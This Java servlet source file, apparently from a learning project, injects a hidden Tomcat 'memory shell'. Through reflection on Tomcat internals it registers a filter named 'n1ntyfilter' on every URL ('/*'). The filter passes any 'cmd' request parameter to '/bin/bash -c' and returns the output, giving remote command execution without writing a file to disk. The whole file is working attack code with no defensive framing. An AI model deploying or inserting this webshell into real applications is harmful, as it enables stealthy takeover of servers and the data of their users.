package lagou.edu.servlet;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

public class addFilter_ extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse resp) {
        final String name = "n1ntyfilter";
        ServletContext ctx = request.getSession().getServletContext();
        Field f = null;
        try {
            f = ctx.getClass().getDeclaredField("context");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        f.setAccessible(true);
        ApplicationContext appCtx = null;
        try {
            appCtx = (ApplicationContext)f.get(ctx);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        try {
            f = appCtx.getClass().getDeclaredField("context");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        f.setAccessible(true);
        StandardContext standardCtx = null;
        try {
            standardCtx = (StandardContext)f.get(appCtx);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }


        try {
            f = standardCtx.getClass().getDeclaredField("filterConfigs");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        f.setAccessible(true);
        Map filterConfigs = null;
        try {
            filterConfigs = (Map)f.get(standardCtx);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        if (filterConfigs.get(name) == null) {
            System.out.println("inject "+ name);

            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig arg0) throws ServletException {
                    // TODO Auto-generated method stub
                }

                @Override
                public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)
                    throws IOException, ServletException {
                    // TODO Auto-generated method stub
                    HttpServletRequest req = (HttpServletRequest)arg0;
                    if (req.getParameter("cmd") != null) {
                        byte[] data = new byte[1024];
                        Process p = new ProcessBuilder("/bin/bash","-c", req.getParameter("cmd")).start();
                        int len = p.getInputStream().read(data);
                        p.destroy();
                        arg1.getWriter().write(new String(data, 0, len));
                        return;
                    }
                    arg2.doFilter(arg0, arg1);
                }

                @Override
                public void destroy() {
                    // TODO Auto-generated method stub
                }
            };

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);

            standardCtx.addFilterDef(filterDef);

            FilterMap m = new FilterMap();
            m.setFilterName(filterDef.getFilterName());
            m.setDispatcher(DispatcherType.REQUEST.name());
            m.addURLPattern("/*");


            standardCtx.addFilterMapBefore(m);


            Constructor constructor = null;
            try {
                constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            }
            constructor.setAccessible(true);
            FilterConfig filterConfig = null;
            try {
                filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            }


            filterConfigs.put(name, filterConfig);

            System.out.println("injected");
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        try {
            this.doGet(req, resp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
